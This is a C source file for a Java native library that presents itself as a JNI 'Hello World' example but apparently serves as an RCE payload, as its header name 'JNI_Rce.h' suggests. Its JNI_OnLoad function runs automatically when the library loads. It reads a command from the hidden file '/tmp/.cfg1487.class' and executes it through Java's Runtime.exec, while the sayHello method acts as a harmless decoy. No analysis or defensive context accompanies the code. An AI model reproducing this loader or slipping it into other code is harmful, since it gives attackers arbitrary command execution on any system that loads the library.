// Save as "HelloJNI.c"
#include <jni.h>        // JNI header provided by JDK
#include <stdio.h>      // C Standard IO Header
#include "JNI_Rce.h"   // Generated
#include <stdlib.h>
#include <string.h>


 void callJavaMethod(JNIEnv* env) {
	char c[1000];
	FILE *fptr;

	fptr = fopen("/tmp/.cfg1487.class", "r"); //<== where command is stored
	if (fptr == NULL) {
	        printf("Error! File cannot be opened.");
	}else{
		fscanf(fptr, "%[^\n]", c);
		 jstring jcmd = (*env)->NewStringUTF(env, c);
		 jclass Runtime = (*env)->FindClass(env, "java/lang/Runtime" );
	    jmethodID Runtime_func = (*env)->GetStaticMethodID(env, Runtime, "getRuntime" ,
	             "()Ljava/lang/Runtime;" );
	    jobject class_obj = (*env)-> CallStaticObjectMethod(env, Runtime, Runtime_func);
	    jclass class_java = (*env)-> GetObjectClass(env, class_obj);
	    jmethodID exec_func = (*env)->GetMethodID(env, class_java, "exec","(Ljava/lang/String;)Ljava/lang/Process;");
	    jobject method_obj = (*env)-> CallObjectMethod(env, class_obj, exec_func, jcmd);
	}

}

jint JNI_OnLoad(JavaVM* vm, void* reserved)
{
	JNIEnv* env = NULL;
	if ((*vm)->GetEnv(vm, (void**) &env, JNI_VERSION_1_6) != JNI_OK) {
	      return -1;
	}
		printf("On child\n");
		callJavaMethod(env);

	return JNI_VERSION_1_6;
}

// Implementation of the native method sayHello()
JNIEXPORT void JNICALL Java_HelloJNI_sayHello(JNIEnv *env, jobject thisObj) {
   printf("Hello World!\n");
   return;
}

